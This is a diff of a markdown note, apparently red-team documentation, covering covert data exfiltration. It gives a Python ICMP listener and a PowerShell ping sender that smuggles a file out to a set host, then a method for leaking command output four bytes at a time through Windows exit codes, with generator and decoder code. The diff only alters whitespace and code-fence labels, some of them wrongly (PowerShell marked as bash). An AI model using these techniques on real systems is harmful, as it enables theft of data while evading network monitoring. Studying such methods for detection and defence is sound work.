@@ -4,9 +4,9 @@
 
 ### Extracting a File
 
-By sending ping packets from our server, with the start marked by `^BOF` and the end marked by `EOF` , we can set up an icmplistener as below which decodes the data packets and then writes them to our file.  This isn't as universal as metasploit's listener, but it servers as a quick and dirty poc if all you're looking to extract is a single file.
+By sending ping packets from our server, with the start marked by `^BOF` and the end marked by `EOF` , we can set up an icmplistener as below which decodes the data packets and then writes them to our file. This isn't as universal as metasploit's listener, but it servers as a quick and dirty poc if all you're looking to extract is a single file.
 
-```py
+```python
 import socket
 
 def listen():
@@ -27,7 +27,7 @@ listen()
 
 A good option for recent Windows based systems is a modified [Powershell-ICMP-Sender](https://github.com/api0cradle/Powershell-ICMP).
 
-```powershell
+```bash
     $IPAddress = "192.168.0.5"
     $ICMPClient = New-Object System.Net.NetworkInformation.Ping
     $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
@@ -66,24 +66,21 @@ A good option for recent Windows based systems is a modified [Powershell-ICMP-Se
     Write-Output "File Transfered"
 ```
 
-
-
-
 ## Error Codes
 
-We can exfiltrate arbitrary data via literally nothing but error-codes.  Here I'll walk through the stages to set up and test this for exfiltrating some file.
+We can exfiltrate arbitrary data via literally nothing but error-codes. Here I'll walk through the stages to set up and test this for exfiltrating some file.
 
-An error code can have a maximum length of 32 bits, or 4 bytes.  We can therefore encode 4 arbitrary bytes within the return of a windows command.
+An error code can have a maximum length of 32 bits, or 4 bytes. We can therefore encode 4 arbitrary bytes within the return of a windows command.
 
-We have data stored within`$env:temp/merror.txt`  and the only parameter we need to know is it's length.  We can run an arbitrary command, store it's output in the file and find out its length by running the following:
+We have data stored within`$env:temp/merror.txt` and the only parameter we need to know is it's length. We can run an arbitrary command, store it's output in the file and find out its length by running the following:
 
-```powershell
+```text
 $command = (Invoke-Command -ScriptBlock {{{0}}} | Out-String).TrimStart().TrimEnd(); $command | Out-File $env:temp/merror.txt -encoding ASCII ;exit $command.length'.format(command)
 ```
 
-We now have to generate our commands to split up the file and return the data.  The following script will return an iterator that will yield commands to run on the remote machine, which will return error codes.
+We now have to generate our commands to split up the file and return the data. The following script will return an iterator that will yield commands to run on the remote machine, which will return error codes.
 
-```py
+```python
 def error_exfil(output_length):
     output_length = int(output_length)
     for start in range(0, int(output_length), 4):
@@ -98,7 +95,7 @@ echo $hex; exit ([convert]::ToInt32($hex, 16));'.format(start, int(start)+int(am
 
 Decoding them on the other end is as simple as:
 
-```py
+```python
 def decode_error(errorval):
     val = hex(int(errorval))[2:]
     if len(val)%2 !=0:
@@ -106,5 +103,4 @@ def decode_error(errorval):
 
     return val.decode('hex')
 ```
-
 
